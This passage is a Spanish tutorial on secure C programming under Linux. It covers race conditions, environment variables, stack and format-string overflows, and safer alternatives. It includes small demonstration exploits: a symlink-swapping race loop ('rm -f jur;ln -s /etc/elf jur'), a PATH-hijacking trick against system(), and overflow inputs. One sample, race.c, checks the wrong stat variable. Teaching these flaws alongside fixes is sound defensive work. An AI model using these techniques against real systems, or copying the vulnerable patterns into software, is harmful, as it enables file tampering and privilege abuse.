*** 5. VERIFICAR LOS VALORES DEVUELTOS

Toda llamada al sistema y funcion en C, puede devolver un valor para definir el
resultado de la operacion que realiza.

Es muy importante verificar cualquier valor devuelto y actuar en consecuencia.
Si hace falta parar el programa deberia hacerse de manera limpia. Es decir:

    * Cerrar todos los archivos abiertos
    * Liberar toda la memoria asignada dinamicamente
    * En caso que se  hayan creado hijos, esperar a que todos  los procesos aca
      ben. Segun el caso,  se debera actuar segun si un hijo termina de manera
      normal o no.

Para terminar un programa de manera limpia lo mas importante es capturar las se
nyales que obligan a terminar un proceso  (por lo menos aquellas que pueden ser
redirigidas). Se puede obtener un listado de todas las senyales con `kill -l`.
[4]

             .--------.
             |  NOTA  | 
             `------- + ---------------------------------.
              | Todas las senyales pueden ser capturadas |
              | y redirigidas excepto SIGKILL y SIGSTOP. |
              `------------------------------------------'


[4] Las senyales aceptadas por el sistema estan definidas en la cabecera
    /usr/include/linux/signal.h




*** 6. RACE CONDITIONS


**  6.1. Introduccion

Se puede definir  una condicion de carrera  (race condition) como un  "Comporta
miento anomalo debido a una dependencia excesiva en el tiempo relativo transcur
rido entre diferentes eventos"  (traduccion de Free On-line Dictionary of Compu
ting).

Estos eventos pueden ser desde funciones que abran un archivo,  cambien sus per
misos, etc.  hasta el cambio de valor de alguna variable compartida por 2 proce
sos.


**  6.2. Condiciones no atomicas

Las  condiciones no atomicas ocurren  cuando no se puede asegurar que una opera
cion y la siguiente van a ocurrir de manera seguida en el procesador. Esto ocur
re cuando despues de la primera operacion, el procesador asigna un intervalo de
tiempo a otro proceso. (fundamento de la multitarea en sistemas monoprocesador)

Este es un ejemplo de programa que contiene una condicion de carrera:

<++> code/race/race.c $19585a709c6616b4bc919fd5fcfdb113
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

#define		ARCHIVO		"/var/tmp2/jur"

int main(void)
{
	FILE *fd;
	struct stat estado, estado2;

	if (access(ARCHIVO, F_OK) < 0)
	{
		fprintf(stderr,"El archivo no existe, creandolo...\n");
		fd = fopen(ARCHIVO,"a");
		fprintf(fd, "Es la primera vez que se crea el archivo\n");
	}
	else
	{
		fprintf(stdout,"El archivo ya existe: anyadiendo caracteres al final\n");
		fd = fopen(ARCHIVO,"r+");
		if (lstat(ARCHIVO, &estado2) == -1)
		{
			perror("lstat");
			exit(-1);
		}
		if (S_ISLNK(estado.st_mode))
		{
			fprintf(stdout,"Race condition conseguido\n");
		}			
		fseek(fd, 0, SEEK_END);
		fprintf(fd, "Hola mundo!\n");
	}
	fclose(fd);
	return(0);
}
<-->

Este sencillo programa, basicamente, lo que hace es:

   * Comprobar la existencia del archivo "jur" en el directorio /var/tmp2.[5]
   * Si no existe, lo crea y escribe en el una notificacion conforme es la pri
     mera vez que se escribe en el archivo.
   * Si existe, abre el archivo y escribe "Hola mundo!".

Ademas, se ha anyadido un trozo de codigo que  comprueba si se ha producido una
condicion de carrera o no. (Esto es irrelevante para demostrar como ocurre real
mente)

Estas operaciones son muy comunes en casi todos los programas existentes.

¿Pero que ocurriria si justo despues de comprobar la existencia del archivo con
la llamada al sistema  access() y justo antes de abrirlo con fopen(),  otro pro
grama interfiriese y cambiase el archivo por un enlace simbolico?

Como podemos  imaginar, el programa,  efectivamente abriria /var/tmp2/jur, pero
al ser un enlace,  realmente estaria operando  sobre el archivo al  que apunta,
por lo que anyadiria datos al final de este.

Este fallo puede permitir crear nuevos archivos o alterar los ya existentes.


*   6.2.1. Demostracion

El metodo mas sencillo,  si no el mas "limpio",  de demostrar este error de pro
gramacion es hacer  ejecutar en un bucle  el programa vulnerable y  varias orde
nes que permitiran enlazar el archivo que se escribe a otro de su eleccion.

Esto es:


<++> code/race/xploit.c $14543093bba996e11eeddeef5aaea3c8
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char **argv)
{

	if (argc < 2)
	{
		fprintf(stderr,"Formato: %s <programa>\n",argv[0]);
		exit(-1);
	}

	while (1)
	{
		system(argv[1]);
		system("rm -f jur;ln -s /etc/elf jur");
	}
	
	return(0);
}
<-->

*   6.2.2. Soluciones

Una de las mejores soluciones a este problema es la propuesta en [GPG]:

<++> code/race/gpg-sol.c $e721879659bb63ac5bdb69a1f3e12d3e
char *filename;
int fd;

do {
	filename = tempnam (NULL, "foo");
	fd = open (filename, O_CREAT | O_EXCL | O_TRUNC | O_RDWR, 0600);
	free(filename);
} while (fd == -1);
<-->

Este fragmento  de codigo intenta crear un archivo con un nombre temporal unico
en un bucle, hasta que lo consigue. Tan sencillo, como util y seguro.



[5] El directorio /var/tmp2 ha sido creado previamente con permisos 0777 (ya
    que se usa como directorio temporal)





*** 7.  VARIABLES DE ENTORNO


**  7.1. Introduccion

Linux, en si, es solamente el nucleo del sistema operativo.  Por si solo es bas
tante inutil  para cualquier usuario,  porque sin ayuda de la gran cantidad  de
programas disponibles no se podria trabajar con el.

Linux no es un sistema operativo  que lleve un entorno grafico programado en el
mismo nucleo  (a diferencia de otros), sino que suele  utilizarse una shell (in
terprete de comandos) como la forma mas "primitiva" de trabajo.

Esta shell es en modo texto,  es decir,  al estilo de MS-DOS.  Y es un programa
mas, que lo que hace  es lanzar otros programas segun  las ordenes que se le va
yan introduciendo.

Como todo programa,  tiene unas variables disponibles que son heredadas por los
procesos que ejecuta.  Estas variables son llamadas variables de entorno o, sim
plemente, entorno. 

Se ha creado un programa  (muestra_env.c) que imprime todo  su entorno al igual
que lo hace env[6].  Si se ejecuta la orden `env` en una shell y luego se lanza
este programa escrito, el resultado deberia ser el mismo:

$ env
PWD=/root/bof/doc/code/env
HZ=100
HOSTNAME=Maas.NeoTek
LS_OPTIONS=--color=auto
PS1=\h:\w\$
USER=root
[...]

$ ./muestra_env
PWD=/root/bof/doc/code/env
HZ=100
HOSTNAME=Maas.NeoTek
LS_OPTIONS=--color=auto
PS1=\h:\w\$
USER=root
[...]

Como se puede apreciar, los dos programas muestran exactamente las mismas varia
bles, con lo que queda demostrado lo que se mencionaba en el paragrafo anterior


**  7.2. Demostracion: system()

Tal como hemos explicado, los programas lanzados desde la shell que usemos here
daran el entorno del padre  (en este caso la shell).  Pero esto ocurre con cual
quier programa que se ejecute dentro de otro.

El uso de la funcion de biblioteca  system() es muy peligroso ya que ejecuta el
programa que se le pasa como argumento  con el mismo entorno que tenia el proce
so que lo llama.

El mayor problema de system() es que si el programa vulnerable (el que es llama
do) no "limpia"  su entorno y lo hace mas seguro,  es posible hacer que ejecute
una orden no deseada.

El siguiente ejemplo lo ilustra:

<++> code/env/exec.c $da9ec3accf9f4e60d55931993b5baab1
#include <stdio.h>

int main(void)
{
	system("ls");
	return(0);
}
<-->

Este  sencillo programa  simplemente ejecuta la orden  ls (recordemos que es el
equivalente al dir de ms-dos). ¿Cual es el problema aqui?

Toda shell utiliza la variable  de entorno PATH para determinar la localizacion
de un ejecutable.  PATH guarda los valores entre ":".  Es decir,  si equivale a
"/bin:/usr/bin", cuando en una shell se escribe:

$ ls

Realmente,  se esta mirando si la orden ls existe en el directorio /bin.  Si no
existe, bajo "/usr/bin".  Y asi sucesivamente, hasta que los valores de PATH se
agotan. Hay que destacar que  siempre se ejecuta la primera ocurrencia de la ca
dena de caracteres escrita.

Volviendo al ejemplo anterior:  se confia en el valor de PATH y  no se tiene en
cuenta que este valor puede ser cambiado por cualquier usuario. Entonces, si se
crea un programa hostil  que ejecute cualquier otra orden,  se le cambia el nom
bre a ls, y se modifica PATH para que valga "./", el resultado sera muy diferen
te.

Para ello se han escrito 3 programas cuyo codigo fuente puede encontrarse en el
Apendice C:

    * exploit.c: Explota el fallo del programa vulnerable exec.
    * ls: Es un programa que escribe en pantalla "El exploit ha funcionado"
          cuando es ejecutado


$ ./exec
exec    execs    exploit    ls           muestra_env.c
exec.c  execs.c  exploit.c  muestra_env

(lista los archivos en el directorio actual tal como esperabamos)

$ ./exploit
El exploit ha funcionado

(ejecuta la orden ls pero que esta contenida en el mismo directorio que exec,
 con lo peligroso que esto puede resultar)

No solo system() padece este problema. Y, de hecho, el problema no reside en la
funcion de libc. El problema real esta en la falta de  desconfianza en respecto
al entorno.

NUNCA se debe confiar en cualquier dato que pueda  ser modificable directa o in
directamente por  un usuario. Por lo que se debe ir con  sumo cuidado al tratar
con variables de entorno.


**  7.3. Soluciones
 
La mejor manera de manejar variables de entorno es borrar todo el entorno desde
el mismo programa e ir anyadiendo las variables que sean realmente necesarias o
borrar el valor  de algunas variables  peligrosas en concreto  y cambiarlas por
otro mas seguro.

La mejor solucion es modificar el programa exec.c, de manera que quede asi:

<++> code/env/execs.c $d70422a3adff655f6db131fd4df7c257
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv, char **envp)
{
	char *variable="PATH=/bin:/sbin:/usr/bin:/usr/sbin";
	
	clearenv();
	putenv(variable);
	system("ls");

	return(0);
}
<-->

Ahora exec  lo que hace es borrar todo el entorno con la funcion  clearenv()  y
darle un valor seguro a la variable PATH.[7]

Esta solucion, se presenta como una de las mas viables para afrontar dicha vul
nerabilidad.


[6] env imprime todas la variables de entorno del proceso actual.
[7] clearenv() no aparece documentada en las paginas del manual del programador 
    `man`.




*** 8. BUFFER OVERFLOWS


**  8.1. Introduccion

Linux protege unos procesos de otros de manera que si un programa falla no va a
interferir con el resto de programas ni el nucleo del sistema operativo y no se
va a venir todo abajo.  Es decir,  se evitan los tediosos y constantes  errores
del sistema tan comunes  en Windows que dejan paralizado el ordenador y obligan
a resetearlo.

Cada proceso se ejecuta en su segmento de memoria.  Ademas, un proceso solo pue
de acceder a datos que esten dentro del segmento de memoria asignado. Cualquier
intento de acceder a datos  que esten fuera de su segmento provocara la termina
cion inmediata del mismo.

Cuando se ejecuta un programa bajo Linux, se siguen, explicado de manera muy es
cueta, los siguientes pasos:

1) El control es pasado al kernel, quien se encarga de crear todas las estructu
   ras de datos necesarias para crear un nuevo proceso y designar las paginas
   de memoria que utilizara.

2) El proceso es dividido en varias partes (segmentos), cada uno con unos permi
   sos concretos.

3) En el segmento de codigo es copiado el codigo del programa.

4) En el segmento de datos (data y bss), se colocan las variables globales y es
   taticas respectivamente.

5) Se crea la pila o stack, que es la seccion mas importante en la tarea de eje
   cucion de un programa.  Contiene variables locales y  el contenido de varios
   registros del procesador importantes.

6) Finalmente,  los argumentos y  variables de entorno  son copiados a continua
   cion de la pila.


Visto de una manera  mas grafica, el espacio de  direccionamiento de un proceso
cualquiera, es parecido a lo siguiente:

                        .            . Direccion de memoria mas alta
                        |____________|
                        |   Entorno  |
                        |------------|
                        | Argumentos |
                        |------------|
                        |            |
                        |    Pila    |
                        |            |
                        |------------|
                        | Datos bss  |
                        |------------|
                        | Datos data |
                        |------------|
                        |            |
                        |   Codigo   |
                        |            |
                        |------------|
                        .            . Direccion de memoria mas baja

**  8.2. El concepto de pila

Como se ha  comentado en el punto anterior,  la pila es una seccion  que cumple
una funcion muy importante en el desarrollo del programa.

Un esquema de como figura esta en memoria es este:

                       .               .  Direccion de memoria mas alta
                       |               |  Zona baja de la pila
                       |    (hacia     |
                       |  memoria del  |
                       |    nucleo)    |
                       |---------------|
                4bytes |   Argumentos  |
                       |---------------|
                4bytes |  # Argumentos |
                       |---------------|
                4bytes |      RET      |
                       |---------------|
                4bytes |      EBP      |
                       |---------------| <-- %ebp apunta aqui
                       |               |
               X bytes |   VARIABLES   |
                       |    LOCALES    |
                       |               |
                       |---------------| <-- %esp apunta aqui
                       | (hacia        |
                       |  segmento de  |
                       |  datos)       | Zona alta de la pila
                       .               . Direccion de memoria mas baja


  * Entorno: Este  campo ocupa 4 bytes  y consiste en un puntero  a un array de
    punteros que contiene cada una de las variables de entorno.  Es la variable
    "char *envp[]".

  * Argumentos: Al igual que el entorno, ocupa 4 bytes y consiste en un puntero
    a un array de punteros,  que contiene cada una de los argumentos pasados al
    programa. Es la variable "char *argv[]".

  * Numero de argumentos: Es un entero de 4 bytes  de longitud que indica el nu
    mero de argumentos que han sido pasados a un programa. Es la variable "int
    argc".

  * RET: Es un puntero  que contiene la direccion de la  instruccion a ejecutar
    una vez se sale de la funcion actual.  Juega un papel muy importante, tanto
    en los buffer  overflows como en el proceso de ejecucion  de un proceso. En
    Linux, esta contenido en el registro EIP del procesador.

  * EBP: Es un puntero  llamado el puntero base.  Este se usa internamente para
    conocer la posicion en memoria de cada variable. Esta contenido en el regis
    tro FP (Frame Pointer) del procesador.

  * Variables locales: Aqui  se guarda todo el conjunto de variables locales de
    un programa.

  * ESP: Si bien no es mencionado como un campo mas de la pila,  ya que este no
    existe como tal,  %esp es un registro del procesador  que siempre apunta al
    inicio de las variables locales.

Hay que destacar  que en los procesadores Intel y  compatibles la memoria crece
de manera negativa, es decir, la zona mas alta de la pila corresponde a la zona
mas baja de memoria. Esto es algo lioso, pero no influencia mucho en la compren
sion de los buffer overflows tal como aqui se exponen,  por lo que se ha inclui
do en el trabajo como una simple aclaracion.


**  8.3. Funcionamiento de un programa bajo Linux

Cada vez que un programa ejecuta una funcion, el procesador se encarga de poner
en el  registro %eip la direccion de  la proxima instruccion  a ejecutar cuando
acabe  la funcion actual.  Con esto, cuando entramos en  la funcion scanf(), el
programa pone en %eip la direccion de printf() (por poner un ejemplo). Entonces
se  recorre toda la funcion,  y al salir de ella,  el programa salta a la direc
cion en memoria a la que apunta %eip. En nuestro caso, la de printf().  Asi, el
control de flujo de cualquier programa tiene los cimientos en este registro.


**  8.4. Desbordamientos de pila

*   8.4.1. Introduccion

Ciertas funciones implementadas en  la libreria estandar C y ampliamente usadas
en muchos programas constituyen  un riesgo de seguridad potencial ya que no che
quean el numero de bytes que estan copiando.

Los desbordamientos de pila (stack overflows)  se basan en conseguir introducir
datos suficientes  como parametro de una funcion vulnerable,  para desbordar el
buffer en el que son copiados, con lo que todos los datos que vienen a continua
cion en la pila se sobrescriben.

El programa de ejemplo siguiente lo ilustra:

<++> code/bof/nombre.c $c23b9282ce1d89e4acc9a8419cf03c7d
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
	char nombre[64];

	if (argv[1])
	{
		strcpy(nombre,argv[1]);
		fprintf(stdout,"%s\n",nombre);
	}
	else
	{
		fprintf(stderr,"Escribe un nombre como primer argumento\n");
	}
	return(0);
}
<-->

Este sencillo programa copia la cadena de caracteres que se le pasa como primer
argumento dentro  de la variable nombre.  Luego imprime por pantalla esta misma
variable.

En una situacion normal  el programa funcionaria sin problema alguno, ya que se
supone que el nombre de cualquier persona no excede de 64 caracteres. 

$ ./nombre "Blowjobs rulez"
Blowjobs rulez

Pero en un entorno hostil se podria forzar el programa para que intentase escri
bir mas de 64 caracteres.

Ocurriria lo siguiente:


$ ./nombre AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Violacion de segmento


Que ha ocurrido?

En este mismo programa, la pila, tendria el siguiente aspecto:


                 VARIABLE NOMBRE       EBP   RET    ARGUMENTOS
      ______________________________________________________________
           |                         |     |     |
      --------------------------------------------------------------
                     64bytes         4bytes 4bytes


Al intentar  escribir mas de 64 bytes  en la variable nombre, hemos sobrescrito
EBP y RET.  Esto quiere decir que hemos alterado el flujo del programa,  y que,
por lo tanto, hemos cambiado la direccion de la siguiente funcion a ejecutar.

Para verlo mas claro, una vez desbordada la pila, esta figuraria asi:


                 VARIABLE NOMBRE       EBP    RET    ARGUMENTOS
      ______________________________________________________________
           | AAAAAAAAAAAAAAAAAAAAAAA | AAAA | AAAA | AAAAAAAAAAAAAAAA 
      --------------------------------------------------------------
                     64bytes          4bytes 4bytes


Realmente lo que ha ocurrido es que el programa, justo despues de copiar el pri
mer argumento en nombre  ha seguido su curso normal y, al acabar,  ha intentado
ejecutar  la siguiente instruccion que esta  en la zona de memoria donde apunta
RET. 

Como  se ha sobrescrito esta direccion (RET)  el programa ha intentado saltar a
la direccion 0x41414141 (valor hexadecimal en ASCII de AAAA). Y debido a que Li
nux protege unos procesos de otros, nos ha dado un error del tipo "Violacion de
segmento" (Segmentation Fault),  avisandonos que se ha producido un error en un
segmento. En nuestro caso, el segmento de pila.


*   8.4.2. Demostracion

El siguiente ejemplo (cambio.c),  ilustra como se pueden sobrescribir variables
sin que  el programa detecte  fallo alguno y presenta  otra funcion vulnerable:
gets().


<++> code/bof/cambio.c $886fb73096d19f5556801c4bcb4f1ef8
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    unsigned int seguridad;
    char nombre[64];

    seguridad = 0;

    fprintf(stdout,"Seguridad: %i\n",seguridad);
    fprintf(stdout,"Introduzca su nombre: ");
    gets(nombre);

    fprintf(stdout,"\nNombre: %s\n",nombre);
    fprintf(stdout,"Seguridad: %i\n",seguridad);

    return(0);
}
<-->

Este programa utiliza 2 variables:  nombre y seguridad.  Nombre es una variable
del tipo cadena de caracteres y seguridad,  del tipo entero, que,  por defecto,
tiene un valor de 0.

Justo al iniciar el programa y preparar el stack, la pila figura asi: 


           VARIABLE NOMBRE     SEGURIDAD    EBP     RET   ARGUMENTOS
      ____________________________________________________________________
        |                     |           |      |      |
      --------------------------------------------------------------------
               64 bytes          4 bytes   4bytes 4bytes


Cabe destacar  que las variables locales de un programa,  residen en la pila en
orden inverso  al que han sido declaradas.  Es decir,  si declaramos en nuestro
programa:

int num;
char letra;

En la seccion  de variables locales de la pila, realmente  estaran colocadas de
esta manera:


                
                  LETRA     NUMERO   EBP     RET     ARGUMENTOS
          ____________________________________________________________
               |         |         |      |      |        
          ------------------------------------------------------------
                                    4bytes 4bytes


Por lo que en el caso anterior es posible sobrescribir la variable seguridad si
sobrepasamos los limites de nombre.

El modo teorico de conseguirlo seria tan simple como escribir tantos caracteres
como espacio ocupa nombre, mas el numero que queremos escribir en seguridad. 

En este caso serian 64 bytes  (porque una variable del tipo char  equivale a un
byte, que es multiplicado por 64 bytes que ocupa nombre)  mas 4 bytes que ocupa
el tipo de datos int.

Es decir, 64 caracteres mas un numero:


$ ./cambio
Introduzca su nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAA1
Nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
Seguridad: 49


El resultado esperado era  que seguridad se hubiera sobrescrito con un 1,  pero
como se puede apreciar, esto no ha sido asi. ¿Por que ha ocurrido?

El secreto esta en que gets()  trata la cadena de texto que copia como una cade
na de caracteres y no le da formato alguno.  Por lo que el 1 es tratado como su
valor en ASCII (49).

La solucion seria escribir un programa como el siguiente[8] (petacambio.c), que
escriba 64 Aes mas un caracter con un valor ASCII de 1:

<++> code/bof/petacambio.c $a8a1382ba61429aafef0e5339354af99
#include <stdio.h>

#define BUFFER 64

int main(void)
{
    int jur=1, loop=BUFFER;

    for (loop=BUFFER; loop > 0; loop--)
        printf("A");
    printf("%c",jur);
    exit(0);
}
<-->

Si ahora ejecutamos:


$ ./petacambio | ./cambio
Introduzca su nombre: Nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAA
Seguridad: 1


Vemos como el resultado es, ahora si, el esperado. Por lo tanto, queda demostra
do como se pueden modificar variables utilizando un desbordamiento de pila.

Paradojicamente, este no es un ejemplo muy comun. Pues normalmente se aprovecha
este error de programacion para intentar ejecutar codigo arbitrario.  Es decir,
para hacer que el programa ejecute una serie de operaciones en concreto.

Antes de hacer una pequenya introduccion a este metodo,  se deben introducir va
rios conceptos nuevos.


**  8.5. Segmento de Codigo

Aunque ya se habia mencionado antes, cabe destacar que el kernel de Linux marca
las paginas de memoria que pertenecen al segmento de codigo con los bits de lec
tura/escritura/ejecucion.

Marcar estas paginas como ejecutables es algo bastante peligroso,  ya que se po
dria introducir codigo malicioso que ejecutase ordenes que no estaban previstas
en el programa.

Aun y asi, Linus Torvalds ya explica en http://lwn.net/980806/linus-noexec.html
porque no modifica las fuentes del kernel para cambiar esta caracteristica.


**  8.6. Shellcodes

Precisamente las  shellcodes (codigos de shell)  son fragmentos de codigo escri
tos en lenguaje ensamblador  que ejecutan una serie de ordenes comunicandose di
rectamente con el kernel, es decir, usando las conocidas llamadas al sistema.

No es el proposito de este trabajo explicar el funcionamiento, como se escriben
shellcodes, ni que limitaciones tienen. Para mas informacion, vease el Apendice
B: Direcciones de interes.


**  8.7. Ejecucion de Codigo Arbitrario

Para conseguir  ejecutar codigo arbitrario,  se aprovecha el hecho de que Linux
permite la ejecucion de codigo contenido en la seccion de la pila,  ya que esta
es marcada con los bits de lectura, escritura y ejecucion,  tal como se comenta
ba antes.

El proceso, consiste en copiar el codigo de shell en el espacio de variables lo
cales aprovechando el error en strcpy(), o cualquier otra funcion vulnerable.

Tambien se sobrescribe RET con la direccion de la shellcode, de manera que cuan
do el programa salga de la funcion principal, main(), el programa saltara al co
digo shell, ejecutando aquellas operaciones que contenga.


**  8.8. Soluciones

La mejor solucion a los stack overflows  es usar funciones que tengan en cuenta
el numero de bytes que se escriben. Por lo que se ha escrito una tabla que rela
ciona funciones vulnerables con la funcion que deberia ser usada en su lugar.


            .-=======================================-.
            |  FUNCION VULNERABLE  |  REEMPLAZAR POR  |
            `-=======================================-'
             |     gets()          |     sscanf()    | 
             |     strcpy()        |     strncpy()   |
             |     sprintf()       |     snprintf()  |
             + ------------------- + ----------------'
             |     getc()          |
             |     getchar()       |
             `---------------------'
                                    getc() y getchar() pueden ser especialmente
                                    vulnerables  si son utilizadas dentro de un
                                    bucle.


[8] Notese que, en la salida del programa, no se reflejara este caracter con va
    lor ASCII 1, porque no es imprimible.




*** 9. FORMAT STRING OVERFLOWS

Cualquier funcion que tome un formato como argumento es vulnerable a un tipo de
buffer overflow llamado format string overflow (overflow de cadena de formato). 
Si el formato no es definido,  un intruso puede conseguir ejecutar  codigo arbi
trario.

Funciones vulnerables:

  - vfprintf() y derivadas: printf(), fprintf(), vprintf() y vfprintf().
  - vsprintf() y derivadas: sprintf(), snprintf(), vsnprintf()...

El modo incorrecto de usar estas funciones es el siguiente:


char string[5] = "Hola\0";
printf(string);


Para corregir este error basta con definir el formato de los datos que se van a
tratar:


char string[5] = "Hola\0";
printf("%s\n",string);


Es importante fijarse en detalles pequenyos como estos, porque pueden comprome
ter totalmente la seguridad de un ordenador.




*** 10. SITUACION ACTUAL DE LA SEGURIDAD INFORMATICA


Un reciente estudio realizado por la revista Information Security revela que el
mayor problema para las empresas referente a la seguridad informatica,  son los
ataques "desde dentro", los realizados por los propios empleados.

Ademas, se ha producido un gran aumento  en las entradas "desde fuera", las rea
lizadas por gente ajena a una empresa.  De hecho, se ha pasado del 12% en 1999,
al 23% en el anyo 2000.

Con todo, se calcula que el coste medio  por empresa en perdidas debido a estos
incidentes asciende a 256.000 dolares.

Contrastando estos datos con los que se ofrecen en  SecurityFocus sobre vulnera
bilidades descubiertas por anyo, se puede apreciar como de 1998 a 1999, el nume
ro de  vulnerabilidades  descubiertas por  errores de programacion bajo Linux y
Windows NT se multiplicaron por 4.

Estos datos son suficientemente alarmantes como para concienciar a las empresas
que llevar una buena politica de seguridad es muy importante. Y que, ademas,
tener en cuenta en esta misma politica, los posibles errores de programacion de
los programas que se instalen, es un algo obligado.




*** 11. CONCLUSIONES

Programar de manera  segura no es facil.  Requiere la comprension de todos aque
llos errores  que pueden cometerse,  y la habilidad  de adelantarse a  posibles
acontecimientos.

Cada vez  mas programadores se van convenciendo  del hecho que,  un poco mas de
esfuerzo puede repercutir de manera muy positiva en la robustez del programa. Y
de que, ademas,  la seguridad de cualquier sistema en el que este sea instalado
depende, en una gran medida, de ellos. Incluso su prestigio como programador es
ta en juego.

Sin embargo,  seria recomendable  leer muchos documentos y  libros acerca de la
programacion segura, antes de embarcarse en un proyecto serio1.

En lo que este trabajo abarca, es importante seguir los pasos siguientes:

 1. Disenyar cuidadosamente el programa antes de escribirlo,intentando imaginar 
    cualquier situacion potencialmente peligrosa y decidir como solucionarla.

 2. Actuar segun el valor devuelto por todas las funciones.

 3. Poner un control sobre que datos pueden introducirse en programa, descartan
    do todo, excepto aquello que es aceptable.

 4. Evitar en la medida de lo posible race conditions.

 5. No confiar en cualquier variable de entorno. Limpiar todo el entorno y lue
    go anyadir las variables pertinentes.

 6. Hacer uso de funciones que tengan en cuenta el limite de caracteres escribi
    bles en una variable. Si no, esto podria desembocar en un buffer overflow.

 7. Dar formato a los datos en las funciones que lo necesiten.

 8. Revisar el codigo del programa desde el punto de vista de un posible intru
    so.

Respecto a la seguridad informatica,  la programacion segura juega un papel muy
importante. Tal como ya se ha comentado en el presente trabajo, es un hecho que
no se  suele tener en  cuenta y,  a decir verdad,  suele ser el factot de mayor
riesgo en penetraciones de sistemas. Es por esto por lo que seria muy recomenda
ble cuestionar la idea de inspeccionar el codigo de todos y cada uno de los pro
gramas que seran instalados  para asegurar que no contienen ningun error de pro
gramacion.

Es una opcion que puede ahorrar muchos dolores de cabeza a miles de empresas de
todo el mundo.  Por lo que es  muy importante  considerarla en los  analisis de
riesgos y de costo-beneficio que deberian hacerse antes de aplicar cualquier po
litica de seguridad.

No gastar una cantidad de dinero considerable en una medida de seguridad concre
ta, podria llegar a repercutir en perdidas millonarias para cualquier empresa.
Es por eso, que analizar y adelantarse a posibles riesgos es muy importante.

Y recuerda: "La paranoia es una virtud"



*** BIBLIOGRAFIA


ALEPH ONE. Smashing the stack for fun and profit.
<http://phrack.infonexus.com/search.phtml?issueno=49&r=0>

BELTRAN, Jon. Lenguaje ensamblador de los 80x86. Madrid, Ediciones Anaya
Multimedia, 1994.

CARD, Remy; DUMAS, Eric; MEVEL, Franck. Programacion Linux 2.0. Api de
Sistema y funcionamiento del nucleo. Trad. de Amadeu Brugues. Barcelona:
Ediciones Gestion 2000. 1997.

DE ICAZA, Miguel; MENA, Federico; WELINDER, Morten.Gnome Programming Guidelines
<http://developer.gnome.org/doc/guides/programming-guidelines/>

GARFINKEL, Simson; SPAFFORD, Gene. Seguridad Practica en Unix e Internet. Trad.
de McGRAW-Hill Interamericana Editores. Mexico: McGRAW-HILL INTERAMERICANA
EDITORES, 1999.

HOWE, Dennis. Free On-Line Dictionary of Computing.
<http://www.foldoc.org/>

LAMAGRA. Format bugs: what they are, where did they come from...
<http://lamagra.sekure.de/>

LLANOS, Diego Rafael. Curso de C bajo UNIX. Salamanca: Universidad de 
Valladolid, 1998.

OH, TAHEO. Advanced buffer overflow exploit.
<http://ohhara.4dl.com/security/>

QUANTUMG. An introduction to executing arbitrary code via stack overflows.
<http://www.sekure.net/~happy-h/>

WHEELER, David A. Secure Programming for Linux and Unix HOWTO.
<http://www.dwheeler.com/secure-programs/>. 1999,2000.



*** APENDICE A: GLOSARIO

A

Argumento: Dato proporcionado a un programa en la linea de comandos.
ASCII: American Standard Code for Information Exchange (Codigo Estandar Ameri
cano para el Intercambio de Informacion). Es un codigo que asocia numeros del
0 al 127 con letras y simbolos de nuestro alfabeto.

B

Biestable: Elemento del procesador que tiene 2 valores estables. Se interpretan
como 1 o 0.
Buffer: Conjunto de datos alineados en memoria.

C

CGI: Common Gateway Interface (Interfaz de Pasarela Comun). Son un tipo de pro
gramas utilizados en los servidores HTTP que sirven como pasarela entre el mis
mo servidor y otra aplicacion.

F

Funcion:  Fragmento de codigo que cumple alguna operacion especifica.

G

GIMP: GNU Image Manipulation Program (Programa de Manipulacion de Imagenes GNU)
Programa de edicion y retoque de imagenes.
GNU: GNU's Not Unix (GNU no es Unix). Siglas del Proyecto GNU, que se dedica a
desarrollar un sistema operativo clon de Unix como software libre. (llamado GNU
/Hurd)

H

HTTP: HyperText Transfer Protocol (Protocolo de Transferencia de HiperTexto).
Es el protocolo usado en los servidores web para transferir paginas web en cual
quier red.


I

IPC: Inter Process Communication (Comunicacion interna de procesos). Mecanismo
que permite intercambiar y compartir datos entre procesos.

K

Kernel: Nucleo del sistema operativo.

L

Linux: Sistema operativo multitarea, multiusuario y multiproceso, de libre dis
tribucion. Esta basado en UNIX.
Llamada al sistema: Nombre que se les da a las funciones implementadas en el
mismo nucleo de Linux.

P

Pila: Concepto abstracto de organizacion de la memoria, que agrupa la seccion
de datos de un proceso (variables locales), los argumentos que se le han pasa
do, las variables de entorno y varios registros del procesador.
Proceso: Se entiende por proceso a un programa que esta corriendo en un determi
nado momento en un ordenador.
Puntero: Tipo de variable que contiene una direccion de memoria. Ocupa 4 bytes
en procesadores Intel y en general se usa para agilizar los accesos a memoria.

R

Registro: Conjunto de elementos biestables que permiten almacenar valores tempo
rales al procesador.
Root: Es el superusuario, el usuario que tiene todos los privilegios en un sis
tema operativo basado en Unix.

S

Segmento: Comunmente, region de memoria que contiene un tipo de datos con unas
caracteristicas parecidas.
Sistema de archivos: Modelo concreto de organizacion de los archivos contenidos
en un soporte fisico.
Sistema Operativo: Es el corazon de un sistema. Se encarga de manejar el ordena
dor a nivel mas bajo para conseguir un nivel mayor de abstraccion del hardware
y una interfaz de mas alto nivel a los programas que tengan que utilizarse so
bre el.
Superusuario: Vease root.

V

Variable: Porcion de memoria accesible por un programa a la que en el momento
de programacion se le asigna y referencia por un nombre. Cada variable es decla
rada de un tipo que define como debe ser interpretada.

W

Webmaster: Persona encargada de llevar un sitio web: crear el sitio, administrarlo, manetenerlo e irlo mejorando. 




*** APENDICE B: DIRECCIONES DE INTERES

GNU Project. <http://www.gnu.org>
Pagina principal del proyecto GNU (GNU's Not Unix).

HISPASEC. <http://www.hispasec.com/>
"HispaSec  esta formado por un grupo de especialistas  en seguridad informatica
 con el proposito de promocionar y concienciar de la importancia de este sector
